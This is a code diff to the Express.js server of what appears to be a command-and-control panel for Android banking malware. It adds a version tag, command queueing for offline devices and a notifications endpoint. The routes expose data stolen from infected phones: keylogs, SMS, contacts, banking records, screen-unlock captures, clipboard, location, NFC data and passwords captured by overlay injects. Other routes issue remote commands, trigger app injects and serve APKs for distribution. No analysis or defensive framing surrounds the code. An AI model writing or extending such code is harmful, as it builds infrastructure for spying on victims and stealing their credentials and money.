@@ -18,12 +18,13 @@ router.use((req, res, next) => {
 // ── Global ────────────────────────────────────────────────────────────────────
 router.get('/stats', (_, res) => {
   const s = q.getStats.get();
-  s.online_count = state.devices.size;
+  s.online_count  = state.devices.size;
   s.server_uptime = process.uptime();
+  s.version       = '4.6.0';
   res.json(s);
 });
 
-router.get('/devices', (_, res) => res.json(q.getAll.all()));
+router.get('/devices',     (_, res) => res.json(q.getAll.all()));
 
 router.get('/devices/:id', (req, res) => {
   const d = q.getOne.get(req.params.id);
@@ -37,33 +38,35 @@ router.post('/devices/:id/command', (req, res) => {
   const { id } = req.params;
   const { action, ...params } = req.body;
   if (!action) return res.status(400).json({ error: 'action required' });
-  const sent = state.sendToDevice(id, { action, ...params });
+  const { sent, queued } = state.queueOrSend(id, { action, ...params });
   q.insertCmd.run(id, action, JSON.stringify(params), sent ? 1 : 0, now());
-  state.broadcastAll({ type: 'command_issued', device_id: id, action, params, sent, ts: now() });
-  res.json({ ok: true, sent });
+  state.broadcastAll({ type: 'command_issued', device_id: id, action, params, sent, queued, ts: now() });
+  res.json({ ok: true, sent, queued });
 });
 
 // ── Data endpoints ─────────────────────────────────────────────────────────────
-router.get('/devices/:id/keylogs',   (req, res) => {
+router.get('/devices/:id/keylogs', (req, res) => {
   const limit  = Math.min(parseInt(req.query.limit  || '100'), 500);
   const offset = parseInt(req.query.offset || '0');
   res.json(q.getKeylogs.all(req.params.id, limit, offset));
 });
 
-router.get('/devices/:id/sms',       (req, res) => res.json(q.getSms.all(req.params.id)));
-router.get('/devices/:id/contacts',  (req, res) => res.json(q.getContacts.all(req.params.id)));
-router.get('/devices/:id/banking',   (req, res) => res.json(q.getBanking.all(req.params.id)));
-router.get('/devices/:id/unlocks',   (req, res) => res.json(q.getUnlocks.all(req.params.id)));
-router.get('/devices/:id/clipboard', (req, res) => res.json(q.getClipboard.all(req.params.id)));
-router.get('/devices/:id/location',  (req, res) => res.json(q.getLocs.all(req.params.id)));
-router.get('/devices/:id/apps',      (req, res) => res.json(q.getApps.all(req.params.id)));
-router.get('/devices/:id/plugins',   (req, res) => res.json(q.getPlugins.all(req.params.id)));
-router.get('/devices/:id/nfc',       (req, res) => res.json(q.getNfcAll.all(req.params.id)));
-router.get('/devices/:id/nfc/last',  (req, res) => res.json(q.getNfcLast.get(req.params.id) || {}));
-router.get('/devices/:id/financial', (req, res) => res.json(q.getFinAlerts.all(req.params.id)));
-router.get('/devices/:id/injects',   (req, res) => res.json(q.getInjectPws.all(req.params.id)));
-router.get('/devices/:id/fakecalls', (req, res) => res.json(q.getFakeCalls.all(req.params.id)));
-router.get('/devices/:id/commands',  (req, res) => {
+router.get('/devices/:id/sms',           (req, res) => res.json(q.getSms.all(req.params.id)));
+router.get('/devices/:id/contacts',      (req, res) => res.json(q.getContacts.all(req.params.id)));
+router.get('/devices/:id/banking',       (req, res) => res.json(q.getBanking.all(req.params.id)));
+router.get('/devices/:id/unlocks',       (req, res) => res.json(q.getUnlocks.all(req.params.id)));
+router.get('/devices/:id/clipboard',     (req, res) => res.json(q.getClipboard.all(req.params.id)));
+router.get('/devices/:id/location',      (req, res) => res.json(q.getLocs.all(req.params.id)));
+router.get('/devices/:id/apps',          (req, res) => res.json(q.getApps.all(req.params.id)));
+router.get('/devices/:id/plugins',       (req, res) => res.json(q.getPlugins.all(req.params.id)));
+router.get('/devices/:id/nfc',           (req, res) => res.json(q.getNfcAll.all(req.params.id)));
+router.get('/devices/:id/nfc/last',      (req, res) => res.json(q.getNfcLast.get(req.params.id) || {}));
+router.get('/devices/:id/financial',     (req, res) => res.json(q.getFinAlerts.all(req.params.id)));
+router.get('/devices/:id/injects',       (req, res) => res.json(q.getInjectPws.all(req.params.id)));
+router.get('/devices/:id/fakecalls',     (req, res) => res.json(q.getFakeCalls.all(req.params.id)));
+router.get('/devices/:id/notifications', (req, res) => res.json(q.getNotifs.all(req.params.id)));
+
+router.get('/devices/:id/commands', (req, res) => {
   const limit  = Math.min(parseInt(req.query.limit  || '100'), 500);
   const offset = parseInt(req.query.offset || '0');
   res.json(q.getCmds.all(req.params.id, limit, offset));
@@ -91,7 +94,7 @@ router.post('/devices/:id/apps/:pkg/inject', (req, res) => {
 });
 
 // ── APKs ─────────────────────────────────────────────────────────────────────
-router.get('/apks',  (_, res)  => res.json(q.getApks.all()));
+router.get('/apks',  (_, res)   => res.json(q.getApks.all()));
 router.post('/apks', (req, res) => {
   const { name, url, size } = req.body;
   q.insertApk.run(name||'', url||'', size||0, now());
